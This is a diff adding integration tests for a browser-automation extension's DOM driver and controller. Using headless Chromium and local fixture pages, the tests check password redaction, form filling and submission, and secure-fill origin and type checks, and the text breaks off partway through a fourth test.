@@ -1,0 +1,1130 @@
+// Integration tests for the DOM-first driver (dist/dom-driver.js) and BrowserController
+// against real HTML fixture pages in headless Chromium, including a foreign
+// chrome-extension:// iframe (simulating Proton Pass / 1Password / Bitwarden).
+import assert from "node:assert/strict";
+import { spawn } from "node:child_process";
+import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
+import http from "node:http";
+import { tmpdir } from "node:os";
+import { dirname, join } from "node:path";
+import test from "node:test";
+import { fileURLToPath } from "node:url";
+import { BrowserController } from "../src/browser-controller.mjs";
+import { DRIVER_VERSION } from "../src/dom-driver.mjs";
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
+const extRoot = join(__dirname, "..");
+const fixturesDir = join(__dirname, "fixtures");
+const driverBundlePath = join(extRoot, "dist", "dom-driver.js");
+
+function findChromiumBinary() {
+  const candidates = [
+    process.env.CHROME_PATH,
+    process.env.CHROMIUM_PATH,
+    "/usr/bin/chromium",
+    "/usr/bin/chromium-browser",
+    "/usr/bin/google-chrome",
+    "/usr/bin/google-chrome-stable",
+    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+  ].filter(Boolean);
+  for (const p of candidates) {
+    if (existsSync(p)) return p;
+  }
+  return null;
+}
+
+async function startFixtureServer() {
+  const server = http.createServer((req, res) => {
+    const cleanPath = (req.url || "/").split("?")[0];
+    const rel = cleanPath === "/" ? "login-with-foreign-extension.html" : cleanPath.replace(/^\/+/, "");
+    const filePath = join(fixturesDir, rel);
+    if (!filePath.startsWith(fixturesDir) || !existsSync(filePath)) {
+      res.writeHead(404);
+      res.end("Not found");
+      return;
+    }
+    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+    res.end(readFileSync(filePath, "utf8"));
+  });
+  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
+  const { port } = server.address();
+  return { server, baseUrl: `http://127.0.0.1:${port}` };
+}
+
+class HarnessCdpClient {
+  constructor(wsUrl) {
+    this.wsUrl = wsUrl;
+    this.nextId = 1;
+    this.pending = new Map();
+    this.events = [];
+  }
+
+  async connect() {
+    this.ws = new WebSocket(this.wsUrl);
+    await new Promise((resolve, reject) => {
+      this.ws.addEventListener("open", resolve, { once: true });
+      this.ws.addEventListener("error", (e) => reject(new Error(e.message || "WebSocket open failed")), { once: true });
+    });
+    this.ws.addEventListener("message", (ev) => {
+      const msg = JSON.parse(String(ev.data));
+      if (msg.id && this.pending.has(msg.id)) {
+        const { resolve, reject } = this.pending.get(msg.id);
+        this.pending.delete(msg.id);
+        if (msg.error) reject(new Error(msg.error.message || "CDP error"));
+        else resolve(msg.result);
+      } else if (msg.method) {
+        this.events.push(msg);
+      }
+    });
+  }
+
+  send(method, params = {}) {
+    const id = this.nextId++;
+    return new Promise((resolve, reject) => {
+      this.pending.set(id, { resolve, reject });
+      this.ws.send(JSON.stringify({ id, method, params }));
+    });
+  }
+
+  async evalInContext(expression, { contextId, awaitPromise = true } = {}) {
+    const params = { expression, returnByValue: true, awaitPromise };
+    if (contextId !== undefined) params.contextId = contextId;
+    const res = await this.send("Runtime.evaluate", params);
+    if (res.exceptionDetails) {
+      throw new Error(res.exceptionDetails.exception?.description || res.exceptionDetails.text || "Eval error");
+    }
+    return res.result?.value;
+  }
+
+  close() {
+    try {
+      this.ws?.close();
+    } catch {}
+  }
+}
+
+async function launchChromium(chromeBin) {
+  const userDataDir = mkdtempSync(join(tmpdir(), "botkins-ext-test-"));
+  const proc = spawn(
+    chromeBin,
+    [
+      "--headless=new",
+      "--no-sandbox",
+      "--disable-gpu",
+      "--disable-dev-shm-usage",
+      "--remote-debugging-port=0",
+      `--user-data-dir=${userDataDir}`,
+      "--window-size=1280,900",
+      "about:blank",
+    ],
+    { stdio: ["ignore", "pipe", "pipe"] },
+  );
+
+  let stderrBuf = "";
+  const wsBrowserUrl = await new Promise((resolve, reject) => {
+    const timer = setTimeout(() => reject(new Error(`Chromium timed out starting. stderr:\n${stderrBuf}`)), 15000);
+    proc.stderr.on("data", (chunk) => {
+      stderrBuf += chunk.toString();
+      const match = stderrBuf.match(/DevTools listening on (ws:\/\/[^\s]+)/);
+      if (match) {
+        clearTimeout(timer);
+        resolve(match[1]);
+      }
+    });
+    proc.once("exit", (code) => {
+      clearTimeout(timer);
+      reject(new Error(`Chromium exited early (${code}). stderr:\n${stderrBuf}`));
+    });
+  });
+
+  const baseHttp = wsBrowserUrl.replace(/^ws:/, "http:").replace(/\/devtools\/browser\/.*$/, "");
+  const targets = await fetch(`${baseHttp}/json/list`).then((r) => r.json());
+  const pageTarget = targets.find((t) => t.type === "page") || targets[0];
+  assert.ok(pageTarget?.webSocketDebuggerUrl, "Expected a Chromium page target");
+
+  const cdp = new HarnessCdpClient(pageTarget.webSocketDebuggerUrl);
+  await cdp.connect();
+  await cdp.send("Page.enable");
+  await cdp.send("Runtime.enable");
+
+  async function navigate(url) {
+    await cdp.send("Page.navigate", { url });
+    // Wait until document + subframes are loaded
+    for (let i = 0; i < 60; i++) {
+      const ready = await cdp.evalInContext(
+        `document.readyState === "complete" && (!document.getElementById("reachable-iframe") || document.getElementById("reachable-iframe").contentDocument?.readyState === "complete")`,
+      );
+      if (ready) break;
+      await new Promise((r) => setTimeout(r, 50));
+    }
+  }
+
+  async function close() {
+    cdp.close();
+    proc.kill("SIGTERM");
+    await new Promise((resolve) => {
+      const t = setTimeout(() => {
+        try {
+          proc.kill("SIGKILL");
+        } catch {}
+        resolve();
+      }, 3000);
+      proc.once("exit", () => {
+        clearTimeout(t);
+        resolve();
+      });
+    });
+    rmSync(userDataDir, { recursive: true, force: true });
+  }
+
+  return { cdp, navigate, close };
+}
+
+const chromeBin = findChromiumBinary();
+
+test(
+  "DOM driver indexes shadow DOM + reachable iframe, redacts passwords, fills React inputs, submits forms, and ignores foreign chrome-extension:// iframes",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    assert.ok(existsSync(driverBundlePath), "dist/dom-driver.js must exist (run `npm run build`)");
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+
+    try {
+      await browser.navigate(`${baseUrl}/login-with-foreign-extension.html`);
+
+      // Verify the foreign chrome-extension:// iframe actually exists in the DOM next to password
+      const foreignSrc = await browser.cdp.evalInContext(
+        `document.getElementById("proton-pass-iframe")?.getAttribute("src")`,
+      );
+      assert.match(foreignSrc, /^chrome-extension:\/\//);
+
+      // Inject the built DOM driver bundle into an isolated world (just like chrome.scripting.executeScript)
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const mainFrameId = frameTree.frameTree.frame.id;
+      const isolated = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: mainFrameId,
+        worldName: "botkins-test-isolated",
+      });
+      const ctxId = isolated.executionContextId;
+
+      await browser.cdp.evalInContext(driverCode, { contextId: ctxId });
+      const version = await browser.cdp.evalInContext(`window.__botkinsDomDriver?.version`, { contextId: ctxId });
+      assert.equal(version, DRIVER_VERSION);
+
+      const callDriver = (action, payload = {}) =>
+        browser.cdp.evalInContext(
+          `window.__botkinsDomDriver.dispatch(${JSON.stringify(action)}, ${JSON.stringify(payload)})`,
+          { contextId: ctxId },
+        );
+
+      // 1. Snapshot indexing (with same-origin iframe traversal enabled)
+      const snap = await callDriver("snapshot", { traverseSameOriginIframes: true });
+      assert.equal(snap.ok, true);
+      assert.equal(snap.title, "Scotch Login Fixture");
+      assert.ok(snap.elements.length >= 9, `Expected >= 9 indexed elements, got ${snap.elements.length}`);
+
+      // Strict password redaction: secret value must NEVER appear anywhere in snapshot
+      const snapJson = JSON.stringify(snap);
+      assert.equal(snapJson.includes("SuperSecretPassword123!"), false, "Password leaked in snapshot!");
+
+      const emailEl = snap.elements.find((e) => e.name === "Email address");
+      const passEl = snap.elements.find((e) => e.name === "Password");
+      const planEl = snap.elements.find((e) => e.name === "Membership Plan");
+      const rememberEl = snap.elements.find((e) => e.name === "Remember this browser");
+      const bioEl = snap.elements.find((e) => e.name === "Delivery Notes");
+      const richEl = snap.elements.find((e) => e.name === "Rich Note");
+      const submitEl = snap.elements.find((e) => e.name === "Sign In");
+      const shadowInputEl = snap.elements.find((e) => e.name === "Shadow Promo Code");
+      const shadowBtnEl = snap.elements.find((e) => e.name === "Apply Shadow Promo");
+      const iframeInputEl = snap.elements.find((e) => e.name === "2FA Code");
+      const iframeBtnEl = snap.elements.find((e) => e.name === "Verify Code");
+
+      assert.ok(emailEl, "Email input indexed");
+      assert.equal(emailEl.role, "textbox");
+      assert.ok(emailEl.box.width > 0 && emailEl.box.height > 0, "Bounding box populated");
+
+      assert.ok(passEl, "Password input indexed");
+      assert.equal(passEl.type, "password");
+      assert.equal(passEl.value, undefined, "Password value must not be emitted");
+      assert.equal(passEl.hasValue, true);
+      assert.equal(passEl.valueState, "filled");
+
+      assert.ok(planEl && planEl.role === "combobox", "Select element indexed");
+      assert.ok(rememberEl && rememberEl.role === "checkbox" && rememberEl.checked === false);
+      assert.ok(bioEl && bioEl.tag === "textarea");
+      assert.ok(richEl && richEl.role === "textbox");
+      assert.ok(submitEl && submitEl.role === "button");
+      assert.ok(shadowInputEl && shadowInputEl.inShadow === true, "Open shadow input indexed");
+      assert.ok(shadowBtnEl && shadowBtnEl.inShadow === true, "Open shadow button indexed");
+      assert.ok(iframeInputEl && iframeBtnEl, "Reachable same-origin iframe elements indexed");
+      assert.equal(
+        snap.elements.some((e) => e.name === "Should Not Appear"),
+        false,
+        "Hidden elements excluded",
+      );
+
+      // 2. React/Vue-compatible fill via native value setter + _valueTracker reset
+      const typedEmail = await callDriver("type", {
+        ref: emailEl.ref,
+        text: "colt@botkins.app",
+        clear: true,
+      });
+      assert.equal(typedEmail.ok, true);
+      const reactState = await browser.cdp.evalInContext(`window.__reactInputState`);
+      assert.equal(reactState.email, "colt@botkins.app", "React value tracker detected native setter fill");
+
+      const emailEvents = await browser.cdp.evalInContext(
+        `window.__events.filter((e) => e.target === "email").map((e) => e.type)`,
+      );
+      for (const expected of ["keydown", "beforeinput", "input", "keyup", "change"]) {
+        assert.ok(emailEvents.includes(expected), `Expected ${expected} event on email input`);
+      }
+
+      // 3. Clearing password updates valueState to "empty" without leaking value
+      await callDriver("type", { ref: passEl.ref, text: "", clear: true });
+      const snapAfterClear = await callDriver("snapshot", { traverseSameOriginIframes: true });
+      const passAfterClear = snapAfterClear.elements.find((e) => e.name === "Password");
+      assert.equal(passAfterClear.hasValue, false);
+      assert.equal(passAfterClear.valueState, "empty");
+
+      // Re-resolve new refs after snapshot (also verify old refs stay cleared cleanly)
+      const freshPlan = snapAfterClear.elements.find((e) => e.name === "Membership Plan");
+      const freshRemember = snapAfterClear.elements.find((e) => e.name === "Remember this browser");
+      const freshBio = snapAfterClear.elements.find((e) => e.name === "Delivery Notes");
+      const freshRich = snapAfterClear.elements.find((e) => e.name === "Rich Note");
+      const freshSubmit = snapAfterClear.elements.find((e) => e.name === "Sign In");
+      const freshShadowInput = snapAfterClear.elements.find((e) => e.name === "Shadow Promo Code");
+      const freshShadowBtn = snapAfterClear.elements.find((e) => e.name === "Apply Shadow Promo");
+      const freshIframeInput = snapAfterClear.elements.find((e) => e.name === "2FA Code");
+      const freshIframeBtn = snapAfterClear.elements.find((e) => e.name === "Verify Code");
+
+      await callDriver("type", { ref: passAfterClear.ref, text: "NewPass!99", clear: true });
+      const selRes = await callDriver("select", { ref: freshPlan.ref, label: "Reserve Club" });
+      assert.equal(selRes.ok, true);
+      assert.equal(selRes.value, "reserve");
+
+      // Click checkbox, type into textarea & contenteditable
+      await callDriver("click", { ref: freshRemember.ref });
+      await callDriver("type", { ref: freshBio.ref, text: "Leave at side gate", clear: true });
+      await callDriver("type", { ref: freshRich.ref, text: "Updated note", clear: true });
+
+      // Open shadow DOM type + click (refs still valid because no snapshot ran since snapAfterClear!)
+      await callDriver("type", { ref: freshShadowInput.ref, text: "SCOTCH20", clear: true });
+      await callDriver("click", { ref: freshShadowBtn.ref });
+      assert.equal(await browser.cdp.evalInContext(`window.__shadowApplied`), "SCOTCH20");
+
+      // Same-origin iframe type + click
+      await callDriver("type", { ref: freshIframeInput.ref, text: "482910", clear: true });
+      await callDriver("click", { ref: freshIframeBtn.ref });
+      assert.equal(await browser.cdp.evalInContext(`window.__frameVerified`), "482910");
+
+      // Click submit button: verifies full pointer/mouse sequence + form.requestSubmit firing once
+      await browser.cdp.evalInContext(`window.__events = []; window.__submits = [];`);
+      const clickSubmit = await callDriver("click", { ref: freshSubmit.ref });
+      assert.equal(clickSubmit.ok, true);
+      const submitEvents = await browser.cdp.evalInContext(
+        `window.__events.filter((e) => e.target === "submit-btn").map((e) => e.type)`,
+      );
+      assert.deepEqual(
+        submitEvents.slice(0, 9),
+        ["pointerover", "pointerenter", "mouseover", "mouseenter", "pointerdown", "mousedown", "pointerup", "mouseup", "click"],
+      );
+      const submits = await browser.cdp.evalInContext(`window.__submits`);
+      assert.equal(submits.length, 1, "form.requestSubmit must fire submit exactly once (no double submit)");
+      assert.equal(submits[0].submitterId, "submit-btn");
+      assert.equal(submits[0].email, "colt@botkins.app");
+      assert.equal(submits[0].passwordLength, 10);
+      assert.equal(submits[0].plan, "reserve");
+      assert.equal(submits[0].remember, true);
+
+      // 4. Wait check (visible text + shadow selector)
+      const waitOk = await callDriver("checkWait", { text: "Signed in as colt@botkins.app", selector: "#shadow-apply" });
+      assert.equal(waitOk.matched, true);
+      const waitMiss = await callDriver("checkWait", { text: "Nonexistent Banner Text" });
+      assert.equal(waitMiss.matched, false);
+
+      // 5. Scroll page + scrollable container
+      const scrolledPage = await callDriver("scroll", { direction: "down", amount: 500 });
+      assert.equal(scrolledPage.ok, true);
+      assert.ok(scrolledPage.scrollY > 0);
+      const scrolledBox = await callDriver("scroll", { selector: "#scroll-box", direction: "down", amount: 200 });
+      assert.equal(scrolledBox.ok, true);
+      assert.ok(scrolledBox.scrollY > 0);
+
+      // 6. DOM press (Backspace edits focused input, Space toggles checkbox)
+      await browser.cdp.evalInContext(`document.getElementById("bio").focus()`);
+      await callDriver("press", { key: "Backspace", code: "Backspace", windowsVirtualKeyCode: 8, rawKey: "Backspace" });
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("bio").value`), "Leave at side gat");
+
+      await browser.cdp.evalInContext(`document.getElementById("remember").focus()`);
+      await callDriver("press", { key: " ", code: "Space", windowsVirtualKeyCode: 32, rawKey: "Space" });
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("remember").checked`), false);
+
+      // 7. Click by text & selector, and type with submit: true (triggers form.requestSubmit)
+      await callDriver("click", { selector: "#remember" });
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("remember").checked`), true);
+
+      await browser.cdp.evalInContext(`window.__submits = [];`);
+      const textClick = await callDriver("click", { text: "Sign In" });
+      assert.equal(textClick.ok, true);
+      assert.equal(await browser.cdp.evalInContext(`window.__submits.length`), 1);
+
+      await browser.cdp.evalInContext(`window.__submits = [];`);
+      const typeSubmit = await callDriver("type", { selector: "#email", text: "enter@botkins.app", clear: true, submit: true });
+      assert.equal(typeSubmit.ok, true);
+      const enterSubmits = await browser.cdp.evalInContext(`window.__submits`);
+      assert.equal(enterSubmits.length, 1);
+      assert.equal(enterSubmits[0].email, "enter@botkins.app");
+
+      // 8. Stale refs from a previous snapshot are cleared when a new snapshot runs
+      await browser.cdp.evalInContext(`document.getElementById("submit-btn").style.display = "none";`);
+      const snapAfterHide = await callDriver("snapshot", { traverseSameOriginIframes: true });
+      assert.equal(snapAfterHide.elements.some((e) => e.name === "Sign In"), false);
+      const staleAttr = await browser.cdp.evalInContext(`document.getElementById("submit-btn").getAttribute("data-botkins-ref")`);
+      assert.equal(staleAttr, null);
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "BrowserController completes full login flow on foreign chrome-extension:// iframe page even when chrome.debugger is blocked",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+
+    try {
+      const pageUrl = `${baseUrl}/login-with-foreign-extension.html`;
+      await browser.navigate(pageUrl);
+
+      // Prepare isolated worlds for reachable frames (top frame = 0, same-origin subframe = 2);
+      // the foreign chrome-extension:// iframe is NOT reachable by chrome.scripting either.
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const topFrame = frameTree.frameTree.frame;
+      const subFrame = (frameTree.frameTree.childFrames || []).find((cf) =>
+        String(cf.frame.url || "").includes("/subframe.html"),
+      )?.frame;
+      assert.ok(subFrame, "Expected reachable same-origin subframe in Chromium");
+
+      const topIso = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: topFrame.id,
+        worldName: "botkins-ctrl-top",
+      });
+      const subIso = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: subFrame.id,
+        worldName: "botkins-ctrl-sub",
+      });
+      const frameContexts = new Map([
+        [0, topIso.executionContextId],
+        [2, subIso.executionContextId],
+      ]);
+
+      const tab = {
+        id: 101,
+        windowId: 1,
+        title: "Scotch Login Fixture",
+        url: pageUrl,
+        active: true,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      let debuggerAttachAttempts = 0;
+
+      globalThis.chrome = {
+        tabs: {
+          query: async () => [tab],
+          get: async () => tab,
+          update: async (_id, patch) => Object.assign(tab, patch),
+          captureVisibleTab: async () => "data:image/jpeg;base64,Vk1JR0VDTk9DRFA=",
+        },
+        windows: { update: async () => ({}) },
+        tabGroups: { query: async () => [] },
+        scripting: {
+          executeScript: async (injection) => {
+            if (injection.world === "MAIN") {
+              const fnSrc = injection.func.toString();
+              const argsJson = JSON.stringify(injection.args || []);
+              const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`);
+              return [{ frameId: 0, result }];
+            }
+            const targetFrames = injection.target.frameIds || (injection.target.allFrames ? [0, 2] : [0]);
+            const out = [];
+            for (const fid of targetFrames) {
+              const ctxId = frameContexts.get(fid);
+              if (!ctxId) continue;
+              if (injection.files) {
+                await browser.cdp.evalInContext(driverCode, { contextId: ctxId });
+                out.push({ frameId: fid, result: undefined });
+              } else {
+                const fnSrc = injection.func.toString();
+                const argsJson = JSON.stringify(injection.args || []);
+                const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`, { contextId: ctxId });
+                out.push({ frameId: fid, result });
+              }
+            }
+            return out;
+          },
+        },
+        debugger: {
+          onDetach: { addListener: () => {} },
+          attach: async () => {
+            debuggerAttachAttempts++;
+            throw new Error("Cannot access a chrome-extension:// URL of different extension");
+          },
+          detach: async () => {},
+          sendCommand: async () => {
+            throw new Error("Cannot access a chrome-extension:// URL of different extension");
+          },
+        },
+      };
+
+      const ctrl = new BrowserController({
+        getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
+        uploadScreenshot: async (b64, name) => `uploaded:${name}:${b64.length}`,
+      });
+
+      // Full DOM-first login workflow succeeds with ZERO chrome.debugger calls!
+      const snap = await ctrl.run("browser_snapshot", { tabId: 101 });
+      assert.equal(debuggerAttachAttempts, 0);
+      assert.equal(JSON.stringify(snap).includes("SuperSecretPassword123!"), false);
+
+      const emailRef = snap.elements.find((e) => e.name === "Email address")?.ref;
+      const passRef = snap.elements.find((e) => e.name === "Password")?.ref;
+      const submitRef = snap.elements.find((e) => e.name === "Sign In")?.ref;
+      const codeRef = snap.elements.find((e) => e.name === "2FA Code")?.ref;
+      const verifyRef = snap.elements.find((e) => e.name === "Verify Code")?.ref;
+      assert.ok(emailRef && passRef && submitRef && codeRef && verifyRef);
+
+      await ctrl.run("browser_type", { tabId: 101, ref: emailRef, text: "colt@scissorsscotch.com", clear: true });
+      await ctrl.run("browser_type", { tabId: 101, ref: passRef, text: "FreshSecret#1", clear: true });
+      await ctrl.run("browser_click", { tabId: 101, ref: submitRef });
+
+      // Interact across subframe refs too
+      await ctrl.run("browser_type", { tabId: 101, ref: codeRef, text: "991122", clear: true });
+      await ctrl.run("browser_click", { tabId: 101, ref: verifyRef });
+
+      const waited = await ctrl.run("browser_wait", { tabId: 101, text: "Signed in as colt@scissorsscotch.com", timeoutMs: 2000 });
+      assert.equal(waited.matched, "text");
+
+      const evalVal = await ctrl.run("browser_eval", {
+        tabId: 101,
+        expression: `({ submits: window.__submits.length, email: window.__submits[0]?.email, frameCode: window.__frameVerified })`,
+      });
+      assert.deepEqual(evalVal.result, { submits: 1, email: "colt@scissorsscotch.com", frameCode: "991122" });
+
+      const shot = await ctrl.run("browser_screenshot", { tabId: 101 });
+      assert.equal(shot.path, "uploaded:browser-tab-101.jpg:16");
+      assert.equal(debuggerAttachAttempts, 0, "Primary DOM-first tools must never attach chrome.debugger");
+
+      // CDP-only operations fail with a clear, actionable message about the foreign extension
+      await assert.rejects(
+        () => ctrl.run("browser_screenshot", { tabId: 101, fullPage: true }),
+        /another extension.*Proton Pass/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_cdp", { tabId: 101, method: "DOM.getDocument" }),
+        /different extension/i,
+      );
+      assert.equal(debuggerAttachAttempts, 2);
+
+      // Secure fill also works on the foreign-extension fixture without attaching chrome.debugger
+      await browser.cdp.evalInContext(`window.__submits = [];`);
+      const foreignFill = await ctrl.runSecureFill({
+        tabId: 101,
+        origin: new URL(pageUrl).origin,
+        allowLocalHttp: true,
+        fields: [
+          { key: "email", kind: "text", value: "member@example.test" },
+          { key: "password", kind: "password", value: "SENTINEL_FOREIGN_PASS_1!" },
+        ],
+        submit: true,
+      });
+      assert.deepEqual(foreignFill, { filled: ["email", "password"], missing: [], submitted: true });
+      assert.equal(JSON.stringify(foreignFill).includes("SENTINEL_FOREIGN_PASS_1!"), false);
+      assert.equal(debuggerAttachAttempts, 2, "secure fill must never attach chrome.debugger");
+      const foreignSubmits = await browser.cdp.evalInContext(`window.__submits`);
+      assert.equal(foreignSubmits.length, 1);
+      assert.equal(foreignSubmits[0].email, "member@example.test");
+      assert.equal(foreignSubmits[0].passwordLength, "SENTINEL_FOREIGN_PASS_1!".length);
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "BrowserController.runSecureFill fills dotted-name forms, enforces origin and password-type checks, and never leaks sentinels",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+    const consoleLogs = [];
+    const origLog = console.log;
+    const origWarn = console.warn;
+    const origError = console.error;
+    const origInfo = console.info;
+    console.log = (...a) => consoleLogs.push(a.join(" "));
+    console.warn = (...a) => consoleLogs.push(a.join(" "));
+    console.error = (...a) => consoleLogs.push(a.join(" "));
+    console.info = (...a) => consoleLogs.push(a.join(" "));
+
+    try {
+      const pageUrl = `${baseUrl}/login-dotted-names.html`;
+      await browser.navigate(pageUrl);
+      const origin = new URL(pageUrl).origin;
+
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const topIso = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: frameTree.frameTree.frame.id,
+        worldName: "botkins-secure-fill",
+      });
+      const tab = {
+        id: 202,
+        windowId: 1,
+        title: "Example Portal Sign In",
+        url: pageUrl,
+        active: true,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      let debuggerAttachAttempts = 0;
+
+      globalThis.chrome = {
+        tabs: {
+          query: async () => [tab],
+          get: async () => tab,
+          update: async (_id, patch) => Object.assign(tab, patch),
+        },
+        windows: { update: async () => ({}) },
+        tabGroups: { query: async () => [] },
+        scripting: {
+          executeScript: async (injection) => {
+            if (injection.files) {
+              await browser.cdp.evalInContext(driverCode, { contextId: topIso.executionContextId });
+              return [{ frameId: 0, result: undefined }];
+            }
+            const fnSrc = injection.func.toString();
+            const argsJson = JSON.stringify(injection.args || []);
+            const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`, {
+              contextId: topIso.executionContextId,
+            });
+            return [{ frameId: 0, result }];
+          },
+        },
+        debugger: {
+          onDetach: { addListener: () => {} },
+          attach: async () => {
+            debuggerAttachAttempts++;
+            throw new Error("Debugger must not be attached");
+          },
+          detach: async () => {},
+          sendCommand: async () => {
+            throw new Error("Debugger must not be called");
+          },
+        },
+      };
+
+      const ctrl = new BrowserController({
+        getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
+      });
+
+      // 1. Snapshot exposes dotted field keys (`LoginModel.Email`, `LoginModel.Password`) and `id` fallback (`tenant_code`).
+      const snap = await ctrl.run("browser_snapshot", { tabId: 202 });
+      const keys = snap.elements.map((e) => e.fieldKey).filter(Boolean);
+      assert.ok(keys.includes("LoginModel.Email"), `Expected LoginModel.Email in ${JSON.stringify(keys)}`);
+      assert.ok(keys.includes("LoginModel.Password"), `Expected LoginModel.Password in ${JSON.stringify(keys)}`);
+      assert.ok(keys.includes("tenant_code"), `Expected tenant_code in ${JSON.stringify(keys)}`);
+
+      // Enforce top-frame-only execution for all subsequent secureFill calls
+      const baseExec = globalThis.chrome.scripting.executeScript;
+      globalThis.chrome.scripting.executeScript = async (injection) => {
+        assert.deepEqual(injection.target.frameIds, [0], "secure fill must only execute in top frame [0]");
+        return baseExec(injection);
+      };
+
+      // 2. Origin mismatch is refused before touching the DOM.
+      const wrongEmailField = { key: "LoginModel.Email", kind: "text", value: "SENTINEL_BAD_ORIGIN_EMAIL" };
+      const wrongPassField = { key: "LoginModel.Password", kind: "password", value: "SENTINEL_BAD_ORIGIN_PASS" };
+      const wrongOriginFields = [wrongEmailField, wrongPassField];
+      await assert.rejects(
+        () => ctrl.runSecureFill({ tabId: 202, origin: "https://other.example.test", fields: wrongOriginFields }),
+        (err) => err.secureCode === "origin_mismatch",
+      );
+      assert.equal(wrongEmailField.value, "", "values must be zeroed even on refusal");
+      assert.equal(wrongPassField.value, "", "values must be zeroed even on refusal");
+      assert.equal(wrongOriginFields.length, 0, "fields array must be emptied after refusal");
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("login-email").value`), "");
+
+      // 3. Password value into a non-password input is refused atomically (nothing filled).
+      const mismatchPassField = { key: "LoginModel.Email", kind: "password", value: "SENTINEL_WRONG_TYPE_PASS" };
+      const mismatchTenantField = { key: "tenant_code", kind: "text", value: "acme" };
+      const mismatchFields = [mismatchPassField, mismatchTenantField];
+      await assert.rejects(
+        () => ctrl.runSecureFill({ tabId: 202, origin, allowLocalHttp: true, fields: mismatchFields }),
+        (err) => err.secureCode === "password_type_mismatch",
+      );
+      assert.equal(mismatchPassField.value, "");
+      assert.equal(mismatchFields.length, 0);
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("login-email").value`), "");
+      assert.equal(await browser.cdp.evalInContext(`document.getElementById("tenant_code").value`), "");
+
+      // 4. Valid secureFill fills dotted names + id fallback, updates React state, submits, zeroes payload, and never echoes values.
+      const sentinelEmail = "SENTINEL_EMAIL_9f2a1c@example.test";
+      const sentinelPass = "SENTINEL_PASS_7e4b8d!";
+      const fillItems = [
+        { key: "LoginModel.Email", kind: "text", value: sentinelEmail },
+        { key: "LoginModel.Password", kind: "password", value: sentinelPass },
+        { key: "tenant_code", kind: "text", value: "north-42" },
+        { key: "nonexistent.field", kind: "text", value: "ignored" },
+      ];
+      const fillPayload = {
+        tabId: 202,
+        origin,
+        allowLocalHttp: true,
+        fields: [...fillItems],
+        submit: true,
+      };
+      const result = await ctrl.runSecureFill(fillPayload);
+      assert.deepEqual(result, {
+        filled: ["LoginModel.Email", "LoginModel.Password", "tenant_code"],
+        missing: ["nonexistent.field"],
+        submitted: true,
+      });
+      assert.equal(JSON.stringify(result).includes(sentinelEmail), false);
+      assert.equal(JSON.stringify(result).includes(sentinelPass), false);
+      for (const f of fillItems) assert.equal(f.value, "", "payload field values must be zeroed after fill");
+      assert.equal(fillPayload.fields.length, 0, "payload fields array must be emptied after fill");
+
+      const state = await browser.cdp.evalInContext(`({
+        react: window.__reactState,
+        submits: window.__submits,
+        events: window.__vueEvents,
+      })`);
+      assert.equal(state.react.email, sentinelEmail);
+      assert.equal(state.react.password, sentinelPass);
+      assert.equal(state.submits.length, 1);
+      assert.equal(state.submits[0].email, sentinelEmail);
+      assert.equal(state.submits[0].passwordMatches, sentinelPass);
+      assert.equal(state.submits[0].tenant, "north-42");
+      assert.equal(state.events.some((e) => e.hasData), false, "InputEvent.data must never carry secret text");
+      assert.equal(debuggerAttachAttempts, 0);
+
+      // 5. Neither sentinel ever appeared in extension console logs.
+      const joinedLogs = consoleLogs.join("\n");
+      assert.equal(joinedLogs.includes(sentinelEmail), false);
+      assert.equal(joinedLogs.includes(sentinelPass), false);
+    } finally {
+      console.log = origLog;
+      console.warn = origWarn;
+      console.error = origError;
+      console.info = origInfo;
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "secret-bearing tab refuses browser_eval, browser_cdp, and typing into filled secrets, redacts code/secret snapshots, isolates other tabs, and clears on SPA clear or navigation",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const { server, baseUrl } = await startFixtureServer();
+    const browser = await launchChromium(chromeBin);
+
+    try {
+      const pageUrlA = `${baseUrl}/login-dotted-names.html`;
+      const pageUrlB = `${baseUrl}/subframe.html`;
+      await browser.navigate(pageUrlA);
+      const originA = new URL(pageUrlA).origin;
+
+      const createTopWorld = async (worldName) => {
